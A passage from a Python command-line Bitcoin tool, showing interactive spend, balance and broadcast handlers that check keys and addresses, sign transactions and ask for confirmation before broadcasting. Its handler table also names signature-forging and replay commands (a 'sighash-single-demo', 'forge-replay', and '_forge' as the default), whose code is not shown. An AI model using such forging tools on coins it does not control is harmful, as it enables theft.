        except ValueError as exc:
            print('  %s' % exc)
            print('  check `address --all` for the public key of your key')
            continue
        return raw.hex()


def _ask_address(prompt: str = 'Address the coins are held at', default: str = '') -> str:
    """Ask for an address; empty input accepts ``default``."""
    while True:
        text = _ask(prompt, default)
        text = text.strip()
        if text:
            return text
        if _STDIN_CLOSED or default:
            return default
        print('  an address is required')


def _spend(args) -> int:
    interactive = not args.json
    network = args.network
    # --kind is optional: if the user did not pin it, the address they enter
    # decides between p2pkh and p2wpkh.
    args.kind_explicit = args.kind is not None
    if args.kind is None:
        args.kind = InputKind.P2PKH

    try:
        private_key = resolve_private_key(args.wif, args.key)
    except ValueError as exc:
        return _fail(exc)
    address, wif, pubkey = key_info(private_key, network, args.kind)

    # --- 0. make sure the user knows which address they are spending from ----
    if interactive:
        print('key format:  compressed (%d-byte public key)' % len(pubkey))
        print('your address: %s' % address)

    # In guided mode ask which coins to spend, up front: the public key, the
    # address holding them, and (below) the transaction id.
    from_address = args.from_address

    def _check_pubkey(supplied: str) -> Optional[int]:
        """None when ``supplied`` is our key, else a failure exit code."""
        text = (supplied or '').strip().lower()
        if text[:2] == '0x':
            text = text[2:]
        if text == pubkey.hex():
            return None
        return _fail(
            ValueError(
                'that public key does not belong to your private key.\n'
                'your public key: %s\n'
                'run `address --all` to see every address this key controls'
                % pubkey.hex()
            )
        )

    if args.pubkey:
        failure = _check_pubkey(args.pubkey)
        if failure is not None:
            return failure
        if interactive:
            print('public key:  matches your private key')

    if interactive and not args.yes and (not args.pubkey or not from_address):
        print()
        print(
            'Tell me which coins to spend. Press Enter to accept the default '
            'shown in [brackets].'
        )
        if not args.pubkey:
            answered = _ask_public_key()  # blank means "don't check"
            if answered:
                failure = _check_pubkey(answered)
                if failure is not None:
                    return failure
                print('public key:  matches your private key')
        if not from_address:
            from_address = _ask_address('Address the coins are held at', address)

    if from_address:
        from .encoding import hash160
        from .wallet import address_types

        expected = (from_address or '').strip()
        supported = address_types(pubkey, network)
        match = [name for name, (value, _) in supported.items() if value == expected]
        if not match:
            hints = ['\naddresses this key controls on %s:' % network]
            for name, (value, note) in supported.items():
                hints.append('  %-20s %s  (%s)' % (name, value, note))
            return _fail(
                ValueError(
                    '%s is not an address this key controls%s'
                    % (expected, '\n'.join(hints))
                )
            )
        if match[0] == 'p2pkh-uncompressed':
            return _fail(
                ValueError(
                    'that is the uncompressed-key address (%s); this tool only signs '
                    'with compressed keys. Use %s instead.'
                    % (expected, supported['p2pkh'][0])
                )
            )
        if match[0] == 'p2sh-p2wpkh':
            return _fail(
                ValueError(
                    'that is a wrapped-segwit address; `spend` only handles p2pkh and '
                    'p2wpkh. Build the transaction manually and sign it with '
                    '`signraw --redeem-script %s`.'
                    % (b'\x00\x14' + hash160(pubkey)).hex()
                )
            )
        if match[0] != args.kind:
            # The address tells us the script type; follow it when the address
            # came from an interactive answer rather than an explicit flag.
            if args.kind_explicit:
                return _fail(
                    ValueError(
                        'that address is %s but --kind is %s; pass --kind %s to spend it'
                        % (match[0], args.kind, match[0])
                    )
                )
            if match[0] == InputKind.P2WPKH:
                if interactive:
                    print(
                        '  %s is a segwit address, so switching to --kind p2wpkh'
                        % expected
                    )
                args.kind = InputKind.P2WPKH
            else:
                return _fail(
                    ValueError(
                        'that address is %s but --kind is %s; pass --kind %s to spend it'
                        % (match[0], args.kind, match[0])
                    )
                )
        if interactive:
            print('spending from: %s (%s) - matches your key' % (expected, match[0]))

    # --- 1. which coins? ask for the txid, then read the amount from the chain
    if interactive:
        print('You are spending from %s (your address for this key)' % address)
    txid = args.txid
    if not txid:
        if not interactive:
            return _fail(ValueError('--txid is required with --json'))
        while True:
            txid = _ask('Transaction id holding the coins (txid)')
            txid = (txid or '').strip().lower()
            if txid[:2] == '0x':
                txid = txid[2:]
            if len(txid) == 64:
                break
            print('  a txid is 64 hex characters (got %d)' % len(txid))
            if _STDIN_CLOSED:
                return _fail(ValueError('txid must be 64 hex characters'))
    txid = (txid or '').strip()
    if len(txid) != 64:
        return _fail(ValueError('txid must be 64 hex characters'))

    prevout_value: Optional[int] = None
    vout = args.vout
    if not args.offline:
        client = _client(args)
        try:
            prev = client.previous_transaction(txid)
        except (BlockCypherError, ValueError) as exc:
            return _fail(exc)

        spendable = prev.unspent()
        if not spendable:
            return _fail(ValueError('every output of %s is already spent' % txid))

        if vout is None:
            if not interactive:
                if len(spendable) != 1:
                    return _fail(
                        ValueError(
                            '%d unspent outputs in this transaction; pick one with --vout'
                            % len(spendable)
                        )
                    )
                vout = spendable[0].index
            if interactive:
                print('\nOutputs of %s:' % txid)
                for output in prev.outputs:
                    print('  %s' % output)
            if len(spendable) == 1:
                vout = spendable[0].index
                if interactive:
                    print('\nUsing vout %d' % vout)
            else:
                vout = _ask_int('Which output index (vout) to spend?', spendable[0].index)

        match = [o for o in prev.outputs if o.index == vout]
        if not match:
            return _fail(ValueError('txid has no output %d' % vout))
        if match[0].spent_by:
            return _fail(ValueError('output %d of %s is already spent' % (vout, txid)))
        prevout_value = match[0].value
        if interactive:
            print('Spending %d sats (vout %d)' % (prevout_value, vout))
    else:
        if interactive:
            print('Offline mode: no chain lookup, amounts must be correct')
        if vout is None:
            return _fail(ValueError('--offline needs --vout'))
        if args.amount is None:
            return _fail(
                ValueError(
                    'offline mode cannot look up the input amount; pass the amount '
                    'explicitly with --json --amount (it is part of the signature)'
                )
            )

    # --- 2. where to, and how much?
    destination = args.address
    if not destination:
        if not interactive:
            return _fail(ValueError('--address is required with --json'))
        destination = _ask('Address to send to')
    destination = (destination or '').strip()
    try:
        destination_script = address_to_script(destination, network)
    except ValueError as exc:
        return _fail(exc)

    if prevout_value is None:
        prevout_value = args.amount
        if prevout_value is None:
            return _fail(ValueError('the input amount is unknown; pass --amount'))

    amount = args.amount
    if amount is None:
        if not interactive:
            return _fail(ValueError('--amount is required with --json'))
        suggested = prevout_value - args.fee
        amount = _ask_int(
            'Amount to send in satoshis (max %d)' % suggested, suggested
        )

    if amount <= 0:
        return _fail(ValueError('amount must be positive'))
    if amount > prevout_value - args.fee:
        return _fail(
            ValueError(
                'amount %d exceeds input %d minus the %d sat fee'
                % (amount, prevout_value, args.fee)
            )
        )

    change = amount and prevout_value - amount - args.fee
    change_address = args.change or address
    try:
        destination_spec = '%s:%d' % (destination, amount)
        output_specs = [destination_spec]
        if change > 0:
            output_specs.append('%s:%d' % (change_address, change))
        built = build_transaction(
            inputs=['%s:%d:%d' % (txid, vout, prevout_value)],
            outputs=output_specs,
            private_key=private_key,
            network=network,
            kind=args.kind,
        )
    except ValueError as exc:
        return _fail(exc)

    # --- 3. show the signature material and offer to broadcast
    if args.json:
        _report_built(built, True)
    else:
        print()
        print(built.report())
        print()
        print('raw transaction: %s' % built.hex)

    if not (args.broadcast or interactive):
        return 0

    if interactive:
        answer = _ask('Broadcast this transaction now? (y/N)', 'n').lower()
        if answer not in ('y', 'yes'):
            print('Not broadcast. The signed hex is above if you want to send it yourself.')
            return 0

    client = _client(args)
    try:
        result = client.push(built.hex)
    except (BlockCypherError, ValueError) as exc:
        return _fail(exc)
    if args.json:
        print(json.dumps({'txid': result.tx_hash, 'response': result.raw}, indent=2))
    else:
        print(result)
        if result.tx_hash and result.tx_hash != built.txid:
            print(
                'warning: node reported txid %s, locally computed %s'
                % (result.tx_hash, built.txid)
            )
    return 0


def _balance(args) -> int:
    try:
        data = _client(args).balance(args.address)
    except (BlockCypherError, ValueError) as exc:
        return _fail(exc)
    if args.json:
        print(json.dumps(data, indent=2))
    else:
        print('address:            %s' % data.get('address', args.address))
        print('balance:            %d sats' % int(data.get('balance', 0)))
        print('unconfirmed:        %d sats' % int(data.get('unconfirmed_balance', 0)))
        print('total:              %d sats' % int(data.get('final_balance', 0)))
        print('transactions:       %d' % int(data.get('final_n_tx', 0)))
    return 0


def _broadcast(args) -> int:
    raw = args.raw
    if raw == '-':
        raw = sys.stdin.read()
    try:
        tx = parse_transaction_hex(raw)
    except ValueError as exc:
        return _fail(exc)

    if not args.json:
        print('network:  %s' % args.network)
        print('txid:     %s' % tx.txid())
        print('size:     %d bytes' % len(tx.serialize()))
        for i, txout in enumerate(tx.outputs):
            print('output %d: %d sats' % (i, txout.value))

    if not args.yes and not args.json:
        if not sys.stdin.isatty():
            return _fail(
                ValueError(
                    'refusing to broadcast without confirmation: pass --yes '
                    '(or use --json) once you have checked the txid above'
                )
            )
        answer = input('broadcast this transaction? [y/N] ').strip().lower()
        if answer not in ('y', 'yes'):
            print('aborted; nothing was broadcast')
            return 1

    try:
        result = _client(args).push(tx.hex())
    except (BlockCypherError, ValueError) as exc:
        return _fail(exc)

    if args.json:
        print(json.dumps({'txid': result.tx_hash, 'response': result.raw}, indent=2))
    else:
        print(result)
        if result.tx_hash and result.tx_hash != tx.txid():
            print(
                'warning: the node reported a different txid (%s) than the local '
                'computation (%s)' % (result.tx_hash, tx.txid())
            )
    return 0


_HANDLERS = {
    'spend': _spend,
    'unspent': _unspent,
    'balance': _balance,
    'broadcast': _broadcast,
    'sighash-single-demo': _analyse,
    'replay-history': _replay_history,
    'forge-replay': _forge_replay,
    'scriptsig': _scriptsig,
    'redeemscript': _redeemscript,
    'pubkey': _pubkey,
    'decodesig': _decodesig,
    'serialize': _serialize,
    'keygen': _keygen,
    'address': _address,
    'sign': _sign,
    'tx': _tx,
    'unsigned': _unsigned,
    'signraw': _signraw,
    'decode': _decode,
}


def main(argv=None) -> int:
    global _STDIN_CLOSED
    _STDIN_CLOSED = False  # each invocation gets a fresh chance to read input
    args = build_parser().parse_args(argv)
    if args.command == 'verify':
        return _verify(args)
    handler = _HANDLERS.get(args.command)
    if handler is not None:
        return handler(args)
    return _forge(args)


if __name__ == '__main__':
    sys.exit(main())
